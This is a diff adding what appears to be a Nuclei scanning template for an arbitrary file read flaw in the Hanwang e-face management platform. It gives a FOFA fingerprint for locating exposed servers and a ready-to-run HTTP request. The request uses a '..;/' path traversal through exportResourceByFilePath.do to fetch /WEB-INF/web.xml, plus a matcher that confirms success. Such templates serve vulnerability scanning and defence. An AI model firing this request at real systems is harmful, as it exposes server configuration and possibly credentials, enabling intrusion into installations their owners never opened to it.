@@ -1,0 +1,24 @@
+id: Hanwang-exportResourceByFilePath-File-reading
+
+info:
+  name: 汉王e脸通综合管理平台 exportResourceByFilePath.do 任意文件读取
+  author: HuanXiong
+  severity: medium
+  description: |-
+    fofa: icon_hash="1380907357"
+  reference:
+    - 
+  tags: File reading
+
+http:
+  - raw:
+      - |
+        GET /manage/intercom/..;/..;/manage/leaveList/exportResourceByFilePath.do?filePath=/WEB-INF/web.xml HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
+
+    matchers:
+      - type: dsl
+        name: 任意文件读取
+        dsl:
+          - "status_code == 200 && contains (body,'监听器') && contains (body,'spring配置文件')"
